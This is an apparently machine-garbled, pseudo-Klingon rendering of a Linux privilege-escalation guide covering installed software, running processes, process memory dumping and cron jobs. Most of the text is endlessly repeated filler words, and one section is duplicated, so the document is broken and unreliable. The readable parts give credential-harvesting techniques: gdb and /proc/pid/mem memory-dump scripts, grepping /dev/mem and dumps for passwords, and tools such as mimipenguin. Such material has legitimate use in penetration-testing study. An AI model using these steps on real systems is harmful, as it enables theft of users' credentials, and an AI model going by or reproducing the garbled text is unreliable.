vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun vItlhutlh** **DIvI'** **ghun vItlhutlh** **'ej ghun v
```bash
dpkg -l #Debian
rpm -qa #Centos
```
**ghItlh** SSH qurgh **machine** vItlhutlh **openVAS** **vulnerable software** **outdated** **check** **use**.

{% hint style="info" %}
_qarDaq**commands** **information** **lot** **show** **useless** **mostly** **will** **that** **be** **will** **therefore** **recommended** **similar** **or** **OpenVAS** **like** **applications** **some** **it's** **exploits** **known** **to** **vulnerable** **is** **version** **software** **installed** **any** **if** **check** **will**_
{% endhint %}

## **Processes**

**ghItlh** **processes** **what** **look** **Take** **should** **it** **than** **privileges** **more** **has** **process** **any** **if** **check** **and** **root** **by** **executed** **being** **tomcat** **a** **maybe**.
```bash
ps aux
ps -ef
top -n 1
```
**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges. **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.

Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Process monitoring

You can use tools like **pspy** to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.

### Process memory

Some services of a server save **credentials in clear text inside the memory**.
Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.
However, remember that **as a regular user you can read the memory of the processes you own**.

{% hint style="warning" %}
Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.

The file _**/proc/sys/kernel/yama/ptrace\_scope**_ controls the accessibility of ptrace:

* **kernel.yama.ptrace\_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
* **kernel.yama.ptrace\_scope = 1**: only a parent process can be debugged.
* **kernel.yama.ptrace\_scope = 2**: Only admin can use ptrace, as it required CAP\_SYS\_PTRACE capability.
* **kernel.yama.ptrace\_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.
{% endhint %}

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

**maps** file **show how memory is mapped within that process's** virtual address space; it also shows the **permissions of each mapped region**. The **mem** pseudo file **exposes the processes memory itself**. From the **maps** file we know which **memory regions are readable** and their offsets. We use this information to **seek into the mem file and dump all readable regions** to a file.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` **vItlhutlh** **physical** memory, **virtual** memory. The kernel's virtual address space can be accessed using /dev/kmem.\
Typically, `/dev/mem` is only readable by **root** and **kmem** group.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump jatlh linux reimagining classic ProcDump tool Sysinternals suite tools Windows. Get [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

To dump a process memory you could use:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_You can manually remove root requirements and dump the process owned by you
* Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root is required)

### Credentials from Process Memory

#### Manual example

If you find that the authenticator process is running:

#### Klingon Translation

### Tools

To dump a process memory you could use:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_You can manually remove root requirements and dump the process owned by you
* Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root is required)

### Credentials from Process Memory

#### Manual example

If you find that the authenticator process is running:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
**You can dump the process (see before sections to find different ways to dump the memory of a process) and search for credentials inside the memory:**

**tlhIngan Hol translation:**

**ghItlhvam vItlhutlh. (ghItlhvam vItlhutlh vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhut
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) will **steal clear text credentials from memory** and from some **well known files**. It requires root privileges to work properly.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Qapla' / Cron jobs

Qapla' jImejDaq vItlhutlh. Qapla' script root (wildcard vuln? root vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq vItlhutlhDaq 